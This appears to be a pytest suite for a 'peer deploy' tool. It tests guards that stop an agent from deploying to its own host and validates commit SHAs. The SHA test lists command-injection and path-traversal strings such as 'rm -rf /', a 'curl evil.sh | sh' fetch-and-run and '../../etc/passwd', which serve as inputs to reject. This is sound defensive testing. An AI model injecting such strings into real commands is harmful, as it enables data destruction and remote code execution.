"""Targeting rules for ``hermes peer deploy``.

The first test in this file is the one that matters: an agent must not be able
to name its own host as the deploy target. Everything else in the blue-green
scheme is a convenience; that assertion is the safety property.
"""

import ipaddress
import socket

import pytest

from hermes_cli.subcommands.peer_deploy_target import (
    DeployTargetError,
    assert_target_is_not_self,
    host_from_peer_url,
    validate_sha,
)


class TestSelfTargetIsRefused:
    """An agent must never actuate its own gateway. Config is the input."""

    @pytest.mark.parametrize("url", [
        "http://localhost:8642",
        "http://127.0.0.1:8642",
        "http://[::1]:8642",
        "127.0.0.1:8642",
    ])
    def test_loopback_in_any_spelling(self, url):
        with pytest.raises(DeployTargetError, match="never deploy itself"):
            assert_target_is_not_self("self-in-disguise", url)

    def test_own_hostname(self):
        host = socket.gethostname()
        with pytest.raises(DeployTargetError, match="THIS machine"):
            assert_target_is_not_self("me", f"http://{host}:8642")

    def test_own_mdns_name(self):
        # The .local form is how these boxes actually address each other, so a
        # peer entry pointing at our own .local must be caught by name.
        host = socket.gethostname().lower()
        with pytest.raises(DeployTargetError, match="THIS machine"):
            assert_target_is_not_self("me-local", f"http://{host}.local:8642")

    def test_unfamiliar_name_that_resolves_to_us(self, monkeypatch):
        """The ssh-alias / DNS case: the name means nothing, the address is ours.

        This is the check that a command-string regex could never make.
        """
        import hermes_cli.subcommands.peer_deploy_target as mod

        monkeypatch.setattr(mod, "_resolve", lambda h: {"192.168.4.22"})
        monkeypatch.setattr(mod, "_own_addresses", lambda: {"192.168.4.22"})
        with pytest.raises(DeployTargetError, match="resolves to an address"):
            assert_target_is_not_self("sneaky", "http://totally-not-me.example:8642")

    def test_name_resolving_to_loopback(self, monkeypatch):
        import hermes_cli.subcommands.peer_deploy_target as mod

        monkeypatch.setattr(mod, "_resolve", lambda h: {"127.0.0.53"})
        monkeypatch.setattr(mod, "_own_addresses", lambda: {"192.168.4.22"})
        with pytest.raises(DeployTargetError, match="loopback"):
            assert_target_is_not_self("aliased", "http://pretend-peer.example:8642")

    def test_extra_self_names_are_honoured(self):
        with pytest.raises(DeployTargetError, match="THIS machine"):
            assert_target_is_not_self(
                "alias", "http://ash-box:8642", extra_self_names=["ash-box"]
            )


class TestGenuinePeerIsAccepted:
    """The accept arm must be a claim about the SUBJECT, not about the box.

    These two cases used to hardcode ``ha-pi.local`` as "a genuine peer" and
    leave ``_own_hostnames`` reading the real machine. On ash's box that is a
    peer; ON HA-PI IT IS THIS MACHINE, so both cases failed forever here and
    the whole file's baseline was red — which withholds every mutation verdict
    (rule 26). A suite's fixture must not be a fact about one host.
    """

    @pytest.fixture
    def _elsewhere(self, monkeypatch):
        import hermes_cli.subcommands.peer_deploy_target as mod

        monkeypatch.setattr(
            mod, "_own_hostnames", lambda: {"localhost", "127.0.0.1", "::1", "this-box"}
        )
        return mod

    def test_a_real_peer_passes(self, monkeypatch, _elsewhere):
        mod = _elsewhere
        monkeypatch.setattr(mod, "_resolve", lambda h: {"192.168.4.100"})
        monkeypatch.setattr(mod, "_own_addresses", lambda: {"192.168.4.22"})
        assert assert_target_is_not_self("peer", "http://other-box.local:8642") == "other-box.local"

    def test_unresolvable_peer_is_allowed_through_name_checks(self, monkeypatch, _elsewhere):
        """DNS being down must not be reinterpreted as 'target is self'.

        Failing closed here would mean a network blip blocks a rollback, which
        is the moment we most need the deploy path to work.
        """
        mod = _elsewhere
        monkeypatch.setattr(mod, "_resolve", lambda h: set())
        assert assert_target_is_not_self("peer", "http://other-box.local:8642") == "other-box.local"

    def test_the_accept_arm_is_not_vacuous(self, monkeypatch, _elsewhere):
        """Non-vacuity: the same shape with a self name MUST still refuse.

        Without this, stubbing _own_hostnames could be widened until nothing is
        ever self and both cases above would pass for free (lesson 49).
        """
        mod = _elsewhere
        monkeypatch.setattr(mod, "_resolve", lambda h: set())
        with pytest.raises(DeployTargetError, match="THIS machine"):
            assert_target_is_not_self("peer", "http://this-box:8642")


class TestMalformedTargets:
    @pytest.mark.parametrize("url", ["", "   ", "://"])
    def test_unparseable_url_is_refused(self, url):
        with pytest.raises(DeployTargetError):
            assert_target_is_not_self("broken", url)

    def test_host_extraction(self):
        assert host_from_peer_url("http://ha-pi.local:8642") == "ha-pi.local"
        assert host_from_peer_url("ha-pi.local:8642") == "ha-pi.local"
        assert host_from_peer_url("") is None


class TestShaValidation:
    """The SHA is interpolated into a remote git command; refuse, don't escape."""

    def test_accepts_abbreviated_and_full(self):
        assert validate_sha("60a4442") == "60a4442"
        assert validate_sha("60a4442826ee063bf39aa26ebac2af0f347cfce0").startswith("60a4442")

    def test_lowercases(self):
        assert validate_sha("60A4442") == "60a4442"

    @pytest.mark.parametrize("bad", [
        "",
        "abc",                                  # too short
        "60a4442; rm -rf /",                    # command injection
        "60a4442 && curl evil.sh | sh",
        "$(whoami)",
        "`id`",
        "main",                                 # a ref, not a SHA
        "../../etc/passwd",
        "60a4442826ee063bf39aa26ebac2af0f347cfce0a",  # too long
    ])
    def test_rejects_anything_not_hex(self, bad):
        with pytest.raises(DeployTargetError):
            validate_sha(bad)


# ===========================================================================
# MUTATION-AUDIT ARMS (wren:i27 round 27, 2026-09-18).
#
# The self-target checks are three INDEPENDENT guards on purpose, and the
# suite drove them through one entry point with the real machine underneath.
# Guards 2 and 3 were each individually deletable green, because guard 1 (the
# name match) refuses the same inputs first -- lesson 77's masking shape, in
# the file whose docstring calls the checks independent.
# ===========================================================================


class TestEachGuardRefusesOnItsOwn:
    """Drive each guard with the other two unable to fire."""

    @pytest.fixture
    def _elsewhere(self, monkeypatch):
        import hermes_cli.subcommands.peer_deploy_target as mod

        monkeypatch.setattr(
            mod, "_own_hostnames", lambda: {"this-box", "this-box.local"}
        )
        monkeypatch.setattr(mod, "_own_addresses", lambda: {"192.168.4.22"})
        return mod

    @pytest.mark.parametrize("literal", ["127.0.0.1", "127.0.0.53", "[::1]"])
    def test_guard2_literal_loopback_with_no_name_or_address_help(
        self, monkeypatch, _elsewhere, literal
    ):
        """A peer URL that is a bare loopback LITERAL. No name matches it once
        the self-name set is somebody else's, and _resolve is empty, so only
        the ip_address(...).is_loopback branch can refuse. Deleting that branch
        passed all 132 cases as merged, because the real machine's name set
        happens to contain the same literals."""
        monkeypatch.setattr(_elsewhere, "_resolve", lambda h: set())
        with pytest.raises(DeployTargetError, match="loopback"):
            assert_target_is_not_self("peer", f"http://{literal}:8642")

    def test_guard2_does_not_refuse_a_routable_literal(self):
        """Precision for guard 2: an IP literal that is NOT loopback and not
        ours must pass, or the arm above is satisfied by a guard that refuses
        every IP."""
        import hermes_cli.subcommands.peer_deploy_target as mod
        import unittest.mock as _mock

        with _mock.patch.object(mod, "_own_hostnames", lambda: {"this-box"}), \
             _mock.patch.object(mod, "_own_addresses", lambda: {"192.168.4.22"}), \
             _mock.patch.object(mod, "_resolve", lambda h: {"192.168.4.100"}):
            assert assert_target_is_not_self("peer", "http://192.168.4.100:8642") == "192.168.4.100"

    def test_guard3_catches_the_lan_address_the_hostname_lookup_misses(
        self, monkeypatch
    ):
        """_own_addresses probes the DEFAULT ROUTE as well as
        getaddrinfo(hostname), because on a box whose hostname resolves only to
        127.0.1.1 the LAN address appears in NEITHER the name set nor the
        hostname lookup. Deleting the route probe was invisible to every case,
        since they all stubbed _own_addresses outright.

        This arm drives the REAL _own_addresses and requires it to report an
        address that is neither loopback nor derived from the hostname.
        """
        import socket

        import hermes_cli.subcommands.peer_deploy_target as mod

        addrs = mod._own_addresses()
        assert addrs, "own-address discovery returned nothing"
        from_hostname = set()
        try:
            for ai in socket.getaddrinfo(socket.gethostname(), None):
                from_hostname.add(str(ai[4][0]))
        except OSError:
            pass
        routable = {
            a for a in addrs
            if not ipaddress.ip_address(a).is_loopback and a not in from_hostname
        }
        assert routable, (
            "_own_addresses found no address beyond loopback and the hostname "
            "lookup. A peer entry naming this machine's LAN address by IP "
            "would then pass every guard and the agent would deploy itself. "
            f"(saw: {sorted(addrs)}, hostname gave: {sorted(from_hostname)})"
        )

    def test_guard3_is_reached_at_all(self, monkeypatch, _elsewhere):
        """Non-vacuity for guard 3: an unfamiliar name resolving onto one of
        our addresses must refuse via the ADDRESS message, not the name one."""
        monkeypatch.setattr(_elsewhere, "_resolve", lambda h: {"192.168.4.22"})
        with pytest.raises(DeployTargetError, match="resolves to an address"):
            assert_target_is_not_self("peer", "http://unfamiliar.example:8642")
